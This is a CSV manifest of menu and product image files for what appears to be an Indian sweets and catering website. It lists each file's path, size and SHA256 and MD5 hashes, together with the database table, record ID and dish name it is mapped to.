Filename,Relative Path,Size (Bytes),SHA256 Hash,MD5 Hash,Status,DB Table,DB Record ID,DB Item Title,DB Image Column
296.jpg,notforgittrack/the-famous-halwai-images/images/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_small_img
297.jpg,notforgittrack/the-famous-halwai-images/images/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_img
297.jpg,notforgittrack/the-famous-halwai-images/images/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_small_img
298.jpeg,notforgittrack/the-famous-halwai-images/images/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_img
298.jpeg,notforgittrack/the-famous-halwai-images/images/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_small_img
299.jpg,notforgittrack/the-famous-halwai-images/images/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_img
299.jpg,notforgittrack/the-famous-halwai-images/images/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_small_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
30.jpeg,notforgittrack/the-famous-halwai-images/images/30.jpeg,12330,6ba1bd163b76baea92af52a28697fd9782fa73834188dcde57bd44d177eeda6d,1ea0f9bcab70d3c623f0f5973262e175,DB Mapped (Verified),menu_item_tbl,30,Mix Pakode,menu_img
300.jpg,notforgittrack/the-famous-halwai-images/images/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_img
300.jpg,notforgittrack/the-famous-halwai-images/images/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_small_img
301.jpg,notforgittrack/the-famous-halwai-images/images/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_img
301.jpg,notforgittrack/the-famous-halwai-images/images/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_small_img
302.jpeg,notforgittrack/the-famous-halwai-images/images/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_img
302.jpeg,notforgittrack/the-famous-halwai-images/images/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_small_img
303.jpg,notforgittrack/the-famous-halwai-images/images/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_img
303.jpg,notforgittrack/the-famous-halwai-images/images/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_small_img
305.jpg,notforgittrack/the-famous-halwai-images/images/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_img
305.jpg,notforgittrack/the-famous-halwai-images/images/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_small_img
306.jpeg,notforgittrack/the-famous-halwai-images/images/306.jpeg,12668,7a868eeea73395f480fcfca0a9d83df54e7ad1364d53e75aef043391d38f75da,edd12741b622bd7a8d5184ab82e0b85c,DB Mapped (Verified),menu_item_tbl,306,Mix Veg.With Brocoli - Chinese,menu_img
307.jpeg,notforgittrack/the-famous-halwai-images/images/307.jpeg,8291,cdd220ea91e6bb8d34606205db3eef349e575cd3ea9ce53b2c9374e852b5e17e,8bd93bb1f86f34a01a22075c40a5a559,DB Mapped (Verified),menu_item_tbl,307,Salt & Pepper Vegetable - Chinese,menu_img
308.jpg,notforgittrack/the-famous-halwai-images/images/308.jpg,146147,13cc46f17caf97cb988c5ba18a18808737b30d15179a11e51f3ac15ab65271e4,79bf5a7c41ee139dd8203f571c392eff,DB Mapped (Verified),menu_item_tbl,308,Vegetable Manchurian - Chinese,menu_img
309.jpg,notforgittrack/the-famous-halwai-images/images/309.jpg,103778,048de34266694795e18258f5b932a400962f25e74d0ca69982ee3b48f423afdc,a543ae4aba2319e3c3ced8d8f0787350,DB Mapped (Verified),menu_item_tbl,309,Hakka Nodles - Chinese,menu_img
31.jpg,notforgittrack/the-famous-halwai-images/images/31.jpg,266894,c8fbc93942b033f1e86a902f46d6efc2e1d8a36ad98e2277cc0a9e24cc7d1681,9561df2274fa4f5b483a56b9bb699a4b,DB Mapped (Verified),menu_item_tbl,31,Fruits,menu_img
31.jpg,notforgittrack/the-famous-halwai-images/images/31.jpg,266894,c8fbc93942b033f1e86a902f46d6efc2e1d8a36ad98e2277cc0a9e24cc7d1681,9561df2274fa4f5b483a56b9bb699a4b,DB Mapped (Verified),product_item_tbl,31,Coriander Coconut Chutney,menu_img
310.jpg,notforgittrack/the-famous-halwai-images/images/310.jpg,46926,a4eaf6e5f8764c982e93a109f639ff3c5b6441eb8234adeffda9206d9a55ea29,7c19dd25d5482147b62d7148d7aa3470,DB Mapped (Verified),menu_item_tbl,310,Chowmein - Chinese,menu_img
311.webp,notforgittrack/the-famous-halwai-images/images/311.webp,31996,d4a74d57a8f932176044cb6a05face3adc178768e3af550fc5143e23209c295f,5abc2991434d82456f7dcf7494415afa,DB Mapped (Verified),menu_item_tbl,311,Noodles - Chinese,menu_img
312.jpg,notforgittrack/the-famous-halwai-images/images/312.jpg,222532,ee1e7f6823f12c3c8212744bd77a594da98ea82c0bd0c737ca675ac936910a60,7da9d93f2f6bb6e789b36c96ea3403aa,DB Mapped (Verified),menu_item_tbl,312,Vegetable Hakka Noodles - Chinese,menu_img
313.jpeg,notforgittrack/the-famous-halwai-images/images/313.jpeg,12293,4729b8e69a8b34abe0cb67404c16f2d4e54a2384020406d17d3236878fc58739,1b2d70f5495a45a3eaa3f8a35f34fd67,DB Mapped (Verified),menu_item_tbl,313,Vegetable Fried Rice - Chinese,menu_img
314.jpeg,notforgittrack/the-famous-halwai-images/images/314.jpeg,13165,2509f6337f0c257864dc25588b9b844a73b9abd40efa2a3622fb6cee1b1c569a,3eb7091fc906091ed3e3d615152aa5f3,DB Mapped (Verified),menu_item_tbl,314,Hongkong Style - Chinese,menu_img
315.jpg,notforgittrack/the-famous-halwai-images/images/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_img
315.jpg,notforgittrack/the-famous-halwai-images/images/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_small_img
316.jpg,notforgittrack/the-famous-halwai-images/images/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_img
316.jpg,notforgittrack/the-famous-halwai-images/images/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_small_img
317.jpeg,notforgittrack/the-famous-halwai-images/images/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_img
317.jpeg,notforgittrack/the-famous-halwai-images/images/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_small_img
318.jpg,notforgittrack/the-famous-halwai-images/images/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_img
318.jpg,notforgittrack/the-famous-halwai-images/images/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_small_img
319.jpg,notforgittrack/the-famous-halwai-images/images/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_img
319.jpg,notforgittrack/the-famous-halwai-images/images/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_small_img
32.jpg,notforgittrack/the-famous-halwai-images/images/32.jpg,170566,461dbac51b9fa2a336ce466768081610e2721af1519730cb004102f6fcbc0cd5,3f3f26f82000bc01a57edd3b1f794a43,DB Mapped (Verified),menu_item_tbl,32,Poha,menu_img
32.jpg,notforgittrack/the-famous-halwai-images/images/32.jpg,170566,461dbac51b9fa2a336ce466768081610e2721af1519730cb004102f6fcbc0cd5,3f3f26f82000bc01a57edd3b1f794a43,DB Mapped (Verified),product_item_tbl,32,Tomato Thokku,menu_img
320.jpeg,notforgittrack/the-famous-halwai-images/images/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_img
320.jpeg,notforgittrack/the-famous-halwai-images/images/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_small_img
321.jpg,notforgittrack/the-famous-halwai-images/images/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_img
321.jpg,notforgittrack/the-famous-halwai-images/images/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_small_img
322.jpg,notforgittrack/the-famous-halwai-images/images/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_img
322.jpg,notforgittrack/the-famous-halwai-images/images/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_small_img
323.jpg,notforgittrack/the-famous-halwai-images/images/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_img
323.jpg,notforgittrack/the-famous-halwai-images/images/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_small_img
324.webp,notforgittrack/the-famous-halwai-images/images/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_img
324.webp,notforgittrack/the-famous-halwai-images/images/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_small_img
325.jpg,notforgittrack/the-famous-halwai-images/images/325.jpg,6539,8b1d732ee69a61ff2f6547c0eb67eb2e44e6486a23aa68de3f8446c2f9ec8372,e908522597bb0b1e5d36f219ee16fd84,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_img
325.jpg,notforgittrack/the-famous-halwai-images/images/325.jpg,6539,8b1d732ee69a61ff2f6547c0eb67eb2e44e6486a23aa68de3f8446c2f9ec8372,e908522597bb0b1e5d36f219ee16fd84,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_small_img
326.jpeg,notforgittrack/the-famous-halwai-images/images/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_img
326.jpeg,notforgittrack/the-famous-halwai-images/images/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_small_img
327.jpg,notforgittrack/the-famous-halwai-images/images/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_img
327.jpg,notforgittrack/the-famous-halwai-images/images/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_small_img
328.jpg,notforgittrack/the-famous-halwai-images/images/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_img
328.jpg,notforgittrack/the-famous-halwai-images/images/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_small_img
329.webp,notforgittrack/the-famous-halwai-images/images/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_img
329.webp,notforgittrack/the-famous-halwai-images/images/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_small_img
33.jpeg,notforgittrack/the-famous-halwai-images/images/33.jpeg,69015,fcafea2e6c4d1affb18e6415fe028ce3f2197e28bebd12ff9bf101e61e347ca9,2d56091dee27659b955a13d7de372655,DB Mapped (Verified),menu_item_tbl,33,Sandwich,menu_img
330.jpg,notforgittrack/the-famous-halwai-images/images/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_img
330.jpg,notforgittrack/the-famous-halwai-images/images/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_small_img
331.jpeg,notforgittrack/the-famous-halwai-images/images/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_img
331.jpeg,notforgittrack/the-famous-halwai-images/images/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_small_img
332.jpeg,notforgittrack/the-famous-halwai-images/images/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_img
332.jpeg,notforgittrack/the-famous-halwai-images/images/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_small_img
333.jpeg,notforgittrack/the-famous-halwai-images/images/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_img
333.jpeg,notforgittrack/the-famous-halwai-images/images/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_small_img
334.jpeg,notforgittrack/the-famous-halwai-images/images/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_img
334.jpeg,notforgittrack/the-famous-halwai-images/images/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_small_img
335.jpeg,notforgittrack/the-famous-halwai-images/images/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_img
335.jpeg,notforgittrack/the-famous-halwai-images/images/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_small_img
336.jpeg,notforgittrack/the-famous-halwai-images/images/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_img
336.jpeg,notforgittrack/the-famous-halwai-images/images/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_small_img
337.webp,notforgittrack/the-famous-halwai-images/images/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_img
337.webp,notforgittrack/the-famous-halwai-images/images/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_small_img
338.jpg,notforgittrack/the-famous-halwai-images/images/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_img
338.jpg,notforgittrack/the-famous-halwai-images/images/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_small_img
339.jpg,notforgittrack/the-famous-halwai-images/images/339.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),menu_item_tbl,339,Besan Masala Rot,menu_img
34.jpg,notforgittrack/the-famous-halwai-images/images/34.jpg,150001,87246438223e89dd79dee6eee7fff35173bbee00c25019ecbddbf031bbe0760a,51484640590527d98c19be361e1c6b51,DB Mapped (Verified),menu_item_tbl,34,Sprouts,menu_img
34.jpg,notforgittrack/the-famous-halwai-images/images/34.jpg,150001,87246438223e89dd79dee6eee7fff35173bbee00c25019ecbddbf031bbe0760a,51484640590527d98c19be361e1c6b51,DB Mapped (Verified),product_item_tbl,34,Moringa Leaves Chutney,menu_img
340.jpeg,notforgittrack/the-famous-halwai-images/images/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_img
340.jpeg,notforgittrack/the-famous-halwai-images/images/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_small_img
341.jpg,notforgittrack/the-famous-halwai-images/images/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_img
341.jpg,notforgittrack/the-famous-halwai-images/images/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_small_img
